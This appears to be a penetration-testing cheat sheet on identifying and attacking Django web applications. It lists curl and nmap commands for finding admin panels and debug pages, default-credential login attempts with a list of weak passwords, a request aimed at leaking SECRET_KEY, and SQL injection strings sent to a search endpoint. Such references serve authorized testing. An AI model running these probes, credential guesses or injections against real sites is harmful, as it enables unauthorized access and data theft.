# Django Framework Identification

**Knowledge Score:** 83/100  
**Last Updated:** June 21, 2026

---

## QUICK COMMANDS

### Identify Django
```bash
curl -sI http://target:8000 | grep -E "Server|X-Framework"
curl -s http://target | grep -i "django\|powered"

# Django admin panel
curl http://target/admin/
curl http://target/admin/login/
curl http://target/django-admin/
```

### Check for Django Admin
```bash
curl -s http://target/admin/ | grep -i "django\|admin"
# 200 OK = admin panel accessible
# 403 Forbidden = requires auth

nmap -p 8000 target  # Common Django port
```

### Test Default Paths
```bash
curl http://target/admin/
curl http://target/static/
curl http://target/media/
curl http://target/api/
```

### Enumerate Users/Auth
```bash
curl http://target/accounts/login/
curl http://target/accounts/register/
curl http://target/user/
curl http://target/profile/
```

---

## ENUMERATION PAYLOADS

### Django Signatures
```bash
# Port 8000 (default)
curl -sI http://target:8000
# Server header or X-Frame-Options
# /admin/ endpoint exists

# Static files
curl http://target/static/
curl http://target/media/
# If directory listing enabled = information leak
```

### Admin Panel Detection
```bash
http://target/admin/
http://target/admin/login/
http://target/django-admin/
http://target/adm/
http://target/administrator/
```

### Common Django Paths
```bash
/static/          # CSS, JS, images
/media/           # User uploads
/api/             # API endpoints
/accounts/        # User management
/api-auth/        # API authentication
```

### Debug Information
```bash
# Django debug mode enabled?
curl http://target/invalid_path
# Full traceback = debug ON (dangerous)
# Generic 404 = debug OFF
```

---

## EXPLOITATION SCENARIOS

### Scenario 1: Access Django Admin Panel
```bash
curl http://target/admin/
# 200 OK = accessible

# Try default credentials
curl -u admin:admin http://target/admin/
curl -d "username=admin&password=admin&next=/admin/" http://target/admin/login/
```

### Scenario 2: Enumerate Installed Apps
```bash
curl http://target/invalid
# If debug=True: Shows installed apps
# Traceback reveals: Models, views, database structure
```

### Scenario 3: Database Enumeration
```bash
# Use admin panel to explore models
http://target/admin/app_name/model_name/
# View all data if authenticated
```

### Scenario 4: Extract Secret Key
```bash
# Debug page sometimes shows:
curl http://target/admin/../bad_path
# Error page might leak: SECRET_KEY, DEBUG status
```

### Scenario 5: Test for SQL Injection
```bash
# Django ORM is safer but custom queries?
curl "http://target/search/?q=test' OR '1'='1"
curl -X POST -d "search=test' OR '1'='1" http://target/search/
```

---

## DETECTION & VERIFICATION

### Confirm Django Running
```bash
curl -sI http://target:8000
curl -sI http://target
# Look for default ports 8000, 8080, 80
```

### Check Debug Mode
```bash
curl http://target/invalid_url
# Debug ON: Full traceback + settings
# Debug OFF: Simple 404 page
```

### Verify Admin Accessibility
```bash
curl -s http://target/admin/ | grep -i "django\|username\|password"
# If login form present = accessible
```

---

## DEFAULT CREDENTIALS TO TEST

```
admin:admin
admin:password
admin:123456
admin:12345678
admin:admin123
root:root
```

---

## DJANGO VERSION DETECTION

| Behavior | Indication |
|----------|-----------|
| `/admin/` accessible | Likely Django |
| `X-Frame-Options` header | Framework security |
| CSRF token in forms | Django CSRF protection |
| `/static/` directory | Django static files |
| `/api/` with DRF | Django REST Framework |

---

## COMMON VULNERABILITIES

- **Debug mode enabled** (traceback leaks code)
- **Weak admin credentials** (default passwords)
- **Exposed SECRET_KEY** (session token forgery)
- **SQL injection** (custom ORM queries)
- **Insecure file upload** (media directory execution)
- **CSRF misconfiguration** (token validation bypass)

---

## QUICK REFERENCE

| Path | Purpose |
|------|---------|
| /admin/ | Django admin panel |
| /accounts/login/ | User authentication |
| /static/ | Static files (CSS, JS) |
| /media/ | User uploads |
| /api/ | API endpoints |

---

## RELATED CHEATSHEETS

- LAMP-Stack-Identification.md
- MERN-Stack-Identification.md
- Next.js-Framework-Identification.md

---

## REFERENCES

- Django Documentation: https://www.djangoproject.com/
- Django Security: https://docs.djangoproject.com/en/stable/topics/security/

---

## CHANGELOG

**v1.0 (2026-06-21)** - Initial creation from Scripts & Notes
- Django admin panel identification
- Default path enumeration
- Debug mode detection
- Authentication testing patterns
